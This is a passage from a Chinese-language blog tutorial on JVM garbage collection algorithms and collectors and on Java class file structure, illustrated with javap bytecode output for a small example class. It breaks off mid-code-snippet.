src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg" alt="image-20220222151708141"></p><p>那么它是如何运作的呢？</p><p>首先，所有新创建的对象，在一开始都会进入到新生代的Eden区（如果是大对象会被直接丢进老年代），在进行新生代区域的垃圾回收时，首先会对所有新生代区域的对象进行扫描，并回收那些不再使用对象：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg" alt="image-20220222153104582"></p><p>接着，在一次垃圾回收之后，Eden区域没有被回收的对象，会进入到Survivor区。在一开始From和To都是空的，而GC之后，所有Eden区域存活的对象都会直接被放入到From区，最后From和To会发生一次交换，也就是说目前存放我们对象的From区，变为To区，而To区变为From区：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg" alt="image-20220222154032674"></p><p>接着就是下一次垃圾回收了，操作与上面是一样的，不过这时由于我们From区域中已经存在对象了，所以，在Eden区的存活对象复制到From区之后，所有To区域中的对象会进行年龄判定（每经历一轮GC年龄<code>+1</code>，如果对象的年龄大于<code>默认值为15</code>，那么会直接进入到老年代，否则移动到From区）</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg" alt="image-20220222154828416"></p><p>最后像上面一样交换To区和From区，之后不断重复以上步骤。</p><p>而垃圾收集也分为：</p><ul><li><p>Minor GC   -   次要垃圾回收，主要进行新生代区域的垃圾收集。</p><ul><li>触发条件：新生代的Eden区容量已满时。</li></ul></li><li><p>Major GC   -   主要垃圾回收，主要进行老年代的垃圾收集。</p></li><li><p>Full GC      -    完全垃圾回收，对整个Java堆内存和方法区进行垃圾回收。</p><ul><li>触发条件1：每次晋升到老年代的对象平均大小大于老年代剩余空间</li><li>触发条件2：Minor GC后存活的对象超过了老年代剩余空间</li><li>触发条件3：永久代内存不足（JDK8之前）</li><li>触发条件4：手动调用<code>System.gc()</code>方法</li></ul><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg" alt="image-20220222205605690"></p></li></ul><h5 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h5><p>前面我们已经了解了整个堆内存实际上是以分代收集机制为主，但是依然没有讲到具体的收集过程，那么，具体的回收过程又是什么样的呢？首先我们来了解一下最古老的<code>标记-清除</code>算法。</p><p>首先标记出所有需要回收的对象，然后再依次回收掉被标记的对象，或是标记出所有不需要回收的对象，只回收未标记的对象。实际上这种算法是非常基础的，并且最易于理解的（这里对象我就以一个方框代替了，当然实际上存放是我们前说到的GC Roots形式）</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg" alt="image-20220222165709034"></p><p>虽然此方法非常简单，但是缺点也是非常明显的 ，首先如果内存中存在大量的对象，那么可能就会存在大量的标记，并且大规模进行清除。并且一次标记清除之后，连续的内存空间可能会出现许许多多的空隙，碎片化会导致连续内存空间利用率降低。</p><h5 id="标记-复制算法"><a href="#标记-复制算法" class="headerlink" title="标记-复制算法"></a>标记-复制算法</h5><p>既然标记清除算法在面对大量对象时效率低，那么我们可以采用标记-复制算法。它将容量分为同样大小的两块区域，</p><p>标记复制算法，实际上就是将内存区域划分为大小相同的两块区域，每次只使用其中的一块区域，每次垃圾回收结束后，将所有存活的对象全部复制到另一块区域中，并一次性清空当前区域。虽然浪费了一些时间进行复制操作，但是这样能够很好地解决对象大面积回收后空间碎片化严重的问题。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg" alt="image-20220222210942507"></p><p>这种算法就非常适用于新生代（因为新生代的回收效率极高，一般不会留下太多的对象）的垃圾回收，而我们之前所说的新生代Survivor区其实就是这个思路，包括8:1:1的比例也正是为了对标记复制算法进行优化而采取的。</p><h5 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h5><p>虽然标记-复制算法能够很好地应对新生代高回收率的场景，但是放到老年代，它就显得很鸡肋了。我们知道，一般长期都回收不到的对象，才有机会进入到老年代，所以老年代一般都是些钉子户，可能一次GC后，仍然存留很多对象。而标记复制算法会在GC后完整复制整个区域内容，并且会折损50%的区域，显然这并不适用于老年代。</p><p>那么我们能否这样，在标记所有待回收对象之后，不急着去进行回收操作，而是将所有待回收的对象整齐排列在一段内存空间中，而需要回收的对象全部往后丢，这样，前半部分的所有对象都是无需进行回收的，而后半部分直接一次性清除即可。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg" alt="image-20220222213208681"></p><p>虽然这样能保证内存空间充分使用，并且也没有标记复制算法那么繁杂，但是缺点也是显而易见的，它的效率比前两者都低。甚至，由于需要修改对象在内存中的位置，此时程序必须要暂停才可以，在极端情况下，可能会导致整个程序发生停顿（被称为“Stop The World”）。</p><p>所以，我们可以将标记清除算法和标记整理算法混合使用，在内存空间还不是很凌乱的时候，采用标记清除算法其实是没有多大问题的，当内存空间凌乱到一定程度后，我们可以进行一次标记整理算法。</p><h4 id="各种垃圾收集器-只讲部分具有代表性的"><a href="#各种垃圾收集器-只讲部分具有代表性的" class="headerlink" title="各种垃圾收集器 (只讲部分具有代表性的)"></a>各种垃圾收集器 (只讲部分具有代表性的)</h4><h5 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h5><p>这款垃圾收集器也是元老级别的收集器了，在JDK1.3.1之前，是虚拟机新生代区域收集器的唯一选择。这是一款单线程的垃圾收集器，也就是说，当开始进行垃圾回收时，需要暂停所有的线程，直到垃圾收集工作结束。它的新生代收集算法采用的是标记复制算法，老年代采用的是标记整理算法。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg" alt="image-20220223104605648"></p><p>可以看到，当进入到垃圾回收阶段时，所有的用户线程必须等待GC线程完成工作，就相当于你打一把游戏，中途每隔1分钟网络就卡5秒钟，这确实让人难以接受。</p><p>虽然缺点很明显，但是优势也是显而易见的：</p><ol><li>设计简单而高效。</li><li>在用户的桌面应用场景中，内存一般不大，可以在较短时间内完成垃圾收集，只要不频繁发生，使用串行回收器是可以接受的。</li></ol><h5 id="ParNew"><a href="#ParNew" class="headerlink" title="ParNew"></a>ParNew</h5><p>这款垃圾收集器相当于是Serial收集器的多线程版本，它能够支持多线程垃圾收集：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg" alt="image-20220223111344962"></p><p>除了多线程支持以外，其他内容基本与Serial收集器一致，并且目前某些JVM默认的服务端模式新生代收集器就是使用的ParNew收集器。</p><h5 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h5><p>在JDK1.5，HotSpot推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是HotSpot虚拟机中第一款真正意义上的并发（注意这里的并发和之前的并行是有区别的，并发可以理解为同时运行用户线程和GC线程，而并行可以理解为多条GC线程同时工作）收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。</p><p>它主要采用标记清除算法：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg" alt="image-20220223114019381"></p><p>它的垃圾回收分为4个阶段：</p><ul><li>初始标记（需要暂停用户线程）：这个阶段的主要任务仅仅只是标记出GC Roots能直接关联到的对象，速度比较快，不用担心会停顿太长时间。</li><li>并发标记：从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行。</li><li>重新标记（需要暂停用户线程）：由于并发标记阶段可能某些用户线程会导致标记产生变得，因此这里需要再次暂停所有线程进行并行标记，这个时间会比初始标记时间长一丢丢。</li><li>并发清除：最后就可以直接将所有标记好的无用对象进行删除，因为这些对象程序中也用不到了，所以可以与用户线程并发运行。</li></ul><p>虽然它的优点非常之大，但是缺点也是显而易见的，我们之前说过，标记清除算法会产生大量的内存碎片，导致可用连续空间逐渐变少，长期这样下来，会有更高的概率触发Full GC，并且在与用户线程并发执行的情况下，也会占用一部分的系统资源，导致用户线程的运行速度一定程度上减慢。</p><p>不过，如果你希望的是最低的GC停顿时间，这款垃圾收集器无疑是最佳选择，不过自从G1收集器问世之后，CMS收集器不再推荐使用了。</p><h5 id="Garbage-First-JDK9"><a href="#Garbage-First-JDK9" class="headerlink" title="Garbage First (JDK9+)"></a>Garbage First (JDK9+)</h5><p>此垃圾收集器也是一款划时代的垃圾收集器，在JDK7的时候正式走上历史舞台，它是一款主要面向于服务端的垃圾收集器，并且在JDK9时，取代了JDK8默认的 Parallel Scavenge + Parallel Old 的回收方案。</p><p>我们知道，我们的垃圾回收分为<code>Minor GC</code>、<code>Major GC </code>和<code>Full GC</code>，它们分别对应的是新生代，老年代和整个堆内存的垃圾回收，而G1收集器巧妙地绕过了这些约定，它将整个Java堆划分成<code>2048</code>个大小相同的独立<code>Region</code>块，每个<code>Region块</code>的大小根据堆空间的实际大小而定，整体被控制在1MB到32MB之间，且都为2的N次幂。所有的<code>Region</code>大小相同，且在JVM的整个生命周期内不会发生改变。</p><p>那么分出这些<code>Region</code>有什么意义呢？每一个<code>Region</code>都可以根据需要，自由决定扮演哪个角色（Eden、Survivor和老年代），收集器会根据对应的角色采用不同的回收策略。此外，G1收集器还存在一个Humongous区域，它专门用于存放大对象（一般认为大小超过了Region容量一半的对象为大对象）这样，新生代、老年代在物理上，不再是一个连续的内存区域，而是到处分布的。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg" alt="image-20220223123636582"></p><p>它的回收过程与CMS大体类似：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg" alt="image-20220223123557871"></p><p>分为以下四个步骤：</p><ul><li>初始标记（暂停用户线程）：仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。</li><li>并发标记：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。</li><li>最终标记（暂停用户线程）：对用户线程做一个短暂的暂停，用于处理并发标记阶段漏标的那部分对象。</li><li>筛选回收：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多个收集器线程并行完成的。</li></ul><h5 id="Shenandoah-amp-ZGC-低延迟"><a href="#Shenandoah-amp-ZGC-低延迟" class="headerlink" title="Shenandoah &amp; ZGC (低延迟)"></a>Shenandoah &amp; ZGC (低延迟)</h5><p>专为低延迟场景特化的垃圾收集器，论综合表现可能比不上G1，但他们暂停线程的时间比G1还要短得多。适合一些对GC延迟有特殊要求的特殊场景。具体不想介绍了，有兴趣可以课下了解，他们的几乎整个工作过程都是并发的，工作原理蛮有意思的。</p><h2 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h2><p>终于写到这里了，我最想讲的就是这个，这个也最好玩:D</p><h3 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h3><p>众所周知，Java是一门跨平台语言，只要能跑JVM的平台都能运行同一份Jar包。而Jar包其实本质上就是一堆class文件和一些资源文件打包放到一个压缩包里罢了，我们也可以直接运行class文件。那么class文件里面有什么内容呢？肯定不可能是机器码吧，如果是机器码要怎么跨平台？答案就是字节码。Kotlin之所以兼容Java，也是因为它是把kt文件编译成字节码，而Java和Kotlin之间的相互调用其实就是字节码之间的调用。JVM内置字节码解释器，在运行时动态解释字节码文件，把字节码翻译成对应平台的机器码运行。</p><h3 id="类文件的基础结构"><a href="#类文件的基础结构" class="headerlink" title="类文件的基础结构"></a>类文件的基础结构</h3><p>Class文件是一组以8个字节为基础单位的二进制流，当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。Class文件使用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型: <strong>无符号数</strong>, <strong>表</strong>。后面的解析都以这两种数据类型为基础。</p><p>我们先来看一段示例代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClazz</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> a<span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute sum function."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们用<code>javap -verbose</code> 指令将它编译并解码为我们肉眼可以观测的字节码</p><pre class="line-numbers language-none"><code class="language-none">Classfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class  Last modified 2022-7-9; size 754 bytes  MD5 checksum 2b38afaa297c7960c988943b0c475282  Compiled from "TestClazz.java"public class kim.bifrost.rain.ksp.TestClazz  minor version: 0  major version: 52  flags: ACC_PUBLIC, ACC_SUPERConstant pool:   #1 = Methodref          #8.#27         // java/lang/Object."&lt;init&gt;":()V   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V   #5 = String             #33            // execute sum function.   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz   #8 = Class              #36            // java/lang/Object   #9 = Utf8               &lt;init&gt;  #10 = Utf8               ()V  #11 = Utf8               Code  #12 = Utf8               LineNumberTable  #13 = Utf8               LocalVariableTable  #14 = Utf8               this  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;  #16 = Utf8               main  #17 = Utf8               ([Ljava/lang/String;)V  #18 = Utf8               args  #19 = Utf8               [Ljava/lang/String;  #20 = Utf8               a  #21 = Utf8               I  #22 = Utf8               b  #23 = Utf8               sum  #24 = Utf8               (II)I  #25 = Utf8               SourceFile  #26 = Utf8               TestClazz.java  #27 = NameAndType        #9:#10         // "&lt;init&gt;":()V  #28 = Class              #37            // java/lang/System  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;  #30 = NameAndType        #23:#24        // sum:(II)I  #31 = Class              #40            // java/io/PrintStream  #32 = NameAndType        #41:#42        // println:(I)V  #33 = Utf8               execute sum function.  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz  #36 = Utf8               java/lang/Object  #37 = Utf8               java/lang/System  #38 = Utf8               out  #39 = Utf8               Ljava/io/PrintStream;  #40 = Utf8               java/io/PrintStream  #41 = Utf8               println  #42 = Utf8               (I)V  #43 = Utf8               (Ljava/lang/String;)V{  public kim.bifrost.rain.ksp.TestClazz();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=1, locals=1, args_size=1         0: aload_0         1: invokespecial #1                  // Method java/lang/Object."&lt;init&gt;":()V         4: return      LineNumberTable:        line 10: 0      LocalVariableTable:        Start  Length  Slot  Name   Signature            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;  public static void main(java.lang.String[]);    descriptor: ([Ljava/lang/String;)V    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=3, locals=3, args_size=1         0: iconst_1         1: istore_1         2: iconst_2         3: iload_1         4: iadd         5: istore_2         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;         9: iload_1        10: iload_2        11: invokestatic  #3                  // Method sum:(II)I        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V        17: return      LineNumberTable:        line 12: 0        line 13: 2        line 14: 6        line 15: 17      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      18     0  args   [Ljava/lang/String;            2      16     1     a   I            6      12     2     b   I}SourceFile: "TestClazz.java"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="魔数-amp-Class文件版本"><a href="#魔数-amp-Class文件版本" class="headerlink" title="魔数 &amp; Class文件版本"></a>魔数 &amp; Class文件版本</h4><p>class文件的前4个Byte被称为魔数(Magic Number), 这些魔数的意义在于标识class文件。在类的加载阶段会根据这头四个Byte判断是否是合法的class文件。魔数的选取也颇有历史渊源<code>0xCAFE BABE</code>，Java的创始人十分喜欢咖啡:)。</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg" alt="aZx0S4EjfY"></p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg" alt="飞书20220709-173350"></p><p>随后第四个字节，也就是7列存储着字节码的版本号。这里是34，从16进制翻译过来就是52，对应着Java8的字节码版本。</p><p>第5和第6个字节是次版本号（Minor Version）,第7，8个字节是主版本号（Major Version）。Java是版本号是从45开始，JDK1.1之后的每个JDK大版本发布主版本号向上+1，高版本的JDK能向下兼容以前版本的Class文件，而不能运行以后版本的Class文件。</p><h4 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h4><p>即</p><pre class="line-numbers language-none"><code class="language-none">Constant pool:   #1 = Methodref          #8.#27         // java/lang/Object."&lt;init&gt;":()V   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V   #5 = String             #33            // execute sum function.   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz   #8 = Class              #36            // java/lang/Object   #9 = Utf8               &lt;init&gt;  #10 = Utf8               ()V  #11 = Utf8               Code  #12 = Utf8               LineNumberTable  #13 = Utf8               LocalVariableTable  #14 = Utf8               this  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;  #16 = Utf8               main  #17 = Utf8               ([Ljava/lang/String;)V  #18 = Utf8               args  #19 = Utf8               [Ljava/lang/String;  #20 = Utf8               a  #21 = Utf8               I  #22 = Utf8               b  #23 = Utf8               sum  #24 = Utf8               (II)I  #25 = Utf8               SourceFile  #26 = Utf8               TestClazz.java  #27 = NameAndType        #9:#10         // "&lt;init&gt;":()V  #28 = Class              #37            // java/lang/System  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;  #30 = NameAndType        #23:#24        // sum:(II)I  #31 = Class              #40            // java/io/PrintStream  #32 = NameAndType        #41:#42        // println:(I)V  #33 = Utf8               execute sum function.  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz  #36 = Utf8               java/lang/Object  #37 = Utf8               java/lang/System  #38 = Utf8               out  #39 = Utf8               Ljava/io/PrintStream;  #40 = Utf8               java/io/PrintStream  #41 = Utf8               println  #42 = Utf8               (I)V  #43 = Utf8               (Ljava/lang/String;)V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>紧接着主次版本号之后的是常量池入口，常量池可以比喻为Class文件里的资源仓库，它是Class文件结构中与其他项目关联最多的数据。</p><p>首先上来就会有一个1字节的无符号数，它用于表示当前常量的类型（常量类型有很多个）这里只列举一部分的类型介绍：</p><table><thead><tr><th align="center">类型</th><th align="center">标志</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">CONSTANT_Utf8_info</td><td align="center">1</td><td align="center">UTF-8编码格式的字符串</td></tr><tr><td align="center">CONSTANT_Integer_info</td><td align="center">3</td><td align="center">整形字面量（第一章我们演示的很大的数字，实际上就是以字面量存储在常量池中的）</td></tr><tr><td align="center">CONSTANT_Class_info</td><td align="center">7</td><td align="center">类或接口的符号引用</td></tr><tr><td align="center">CONSTANT_String_info</td><td align="center">8</td><td align="center">字符串类型的字面量</td></tr><tr><td align="center">CONSTANT_Fieldref_info</td><td align="center">9</td><td align="center">字段的符号引用</td></tr><tr><td align="center">CONSTANT_Methodref_info</td><td align="center">10</td><td align="center">方法的符号引用</td></tr><tr><td align="center">CONSTANT_MethodType_info</td><td align="center">16</td><td align="center">方法类型</td></tr><tr><td align="center">CONSTANT_NameAndType_info</td><td align="center">12</td><td align="center">字段或方法的部分符号引用</td></tr></tbody></table><p>实际上这些东西，虽然我们不知道符号引用是什么东西，我们可以观察出来，这些东西或多或少都是存放类中一些名称、数据之类的东西。</p><p>比如我们来看第一个<code>CONSTANT_Methodref_info</code>表中存放了什么数据，这里我只列出它的结构表（详细的结构表可以查阅《深入理解Java虚拟机 第三版》中222页总表）：</p><table><thead><tr><th align="center">常量</th><th align="center">项目</th><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">CONSTANT_Methodref_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">值为10</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">指向声明方法的类描述父CONSTANT_Class_info索引项</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">指向名称及类型描述符CONSTANT_NameAndType_info索引项</td></tr></tbody></table><p>再看看它指向的<code>CONSTANT_Class_info</code>和<code>CONSTANT_NameAndType_info</code>的结构</p><table><thead><tr><th align="center">常量</th><th align="center">项目</th><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">CONSTANT_Class_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">值为7</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">指向全限定名常量项的索引</td></tr></tbody></table><table><thead><tr><th align="center">常量</th><th align="center">项目</th><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">CONSTANT_NameAndType_info</td><td align="center">tag</td><td align="center">u1</td><td align="center">值为12</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">指向字段或方法名称常量项的索引</td></tr><tr><td align="center"></td><td align="center">index</td><td align="center">u2</td><td align="center">指向字段或方法描述符常量项的索引</td></tr></tbody></table><h5 id="方法标识符"><a href="#方法标识符" class="headerlink" title="方法标识符"></a>方法标识符</h5><p>再说一下方法标识符，我们先找到sum方法的NameAndType常量</p><blockquote><p>#30 = NameAndType        #23:#24        // sum:(II)I</p></blockquote><p>我们会发现这里已经为我们标识出来了，#23对应<code>sum</code>，也就是方法名称。#24对应<code>(II)I</code>即方法标识符。</p><p>那么这个(II)I有什么意思呢，括号内的两个I代表该方法有两个int类型的形参，括号后面的I代表该方法的返回值是int类型。</p><p>至于不同类型的修饰符，我贴一个表在下面:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg" alt="image-20220223192518999"></p><p>构造器的标识符为<code>()V</code>，即一个无形参，返回值为void类型的方法。</p><p>再举几个例子:</p><blockquote><p>public Set<arathothattribute> getAttrInstSet()</arathothattribute></p><p>()Ljava/util/Set&lt;ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;&gt;;</p><p>如你所见，泛型并不会在编译时被擦除，只会在运行时</p><p>所以我们可以在运行时通过草字节码的方式获得一个已经被擦除的泛型</p></blockquote><blockquote><p>public Double getRandom(Double value1, Double value2)</p><p>(Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;</p><p>装箱后的基础类型实际上是类</p><p>提点题外话</p><p>public double sum(Double value1, double value2) {</p><p>​        return value1 + value2;</p><p>}</p><p>你们觉得它编译出来字节码会怎么样:), 实际上字节码调用了value1的doubleValue()方法得到了未装箱的值，再进行相加。</p><p>反之亦然，java有自动装箱和自动拆箱的特性。</p></blockquote><blockquote><p>那么数组会如何呢</p><p>public double[] getRandomNums()</p><p>()[D</p><p>当然是在前面加个[</p></blockquote><h4 id="访问标志"><a href="#访问标志" class="headerlink" title="访问标志"></a>访问标志</h4><p>即</p><pre class="line-numbers language-none"><code class="language-none">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从字面上应该就能猜出这些访问标志的意思，它们用来描述一个类/方法/字段的各种修饰符。</p><p>类的标志类型:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg" alt="image-20220223200619811"></p><p>字段的标志类型:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg" alt="image-20220223201053780"></p><p>方法的标志类型:</p><table><thead><tr><th>标志名称</th><th>标志值</th><th>含义</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>方法是否为public</td></tr><tr><td>ACC_PRIVATE</td><td>0x0002</td><td>方法是否为private</td></tr><tr><td>ACC_PROTECTED</td><td>0x0004</td><td>方法是否为protected</td></tr><tr><td>ACC_STATIC</td><td>0x0008</td><td>方法是否为static</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>方法是否为final</td></tr><tr><td>ACC_SYNCHRONIZED</td><td>0x0020</td><td>方法是否为synchronized</td></tr><tr><td>ACC_BRIDGE</td><td>0x0040</td><td>方法是不是由编译器产生的桥接方法</td></tr><tr><td>ACC_VARARGS</td><td>0x0080</td><td>方法是否接受不定参数</td></tr><tr><td>ACC_NATIVE</td><td>0x0100</td><td>方法是否为native</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>方法是否为abstract</td></tr><tr><td>ACC_STRICT</td><td>0x0800</td><td>方法是否为strictfp</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>方法是否由编译器自动产生</td></tr></tbody></table><h4 id="字节码指令"><a href="#字节码指令" class="headerlink" title="字节码指令"></a>字节码指令</h4><blockquote><p>我觉得字节码要细讲完全可以再单开一篇讲，这里就稍微讲一点基础的，让待会ASM的时候不至于完全懵逼就行</p></blockquote><p>前面讲了这么多基本都是描述类和方法的信息，大家一定很好奇我们编写的程序逻辑到底放在哪里了吧。没错，我们编写的逻辑被编译成了面向操作<strong>操作数栈</strong>的字节码指令。为什么要说它是面向<strong>操作数栈</strong>的操作指令？接下来我会讲一讲main方法中所有字节码指令的作用，听完你们就知道了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> a<span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token 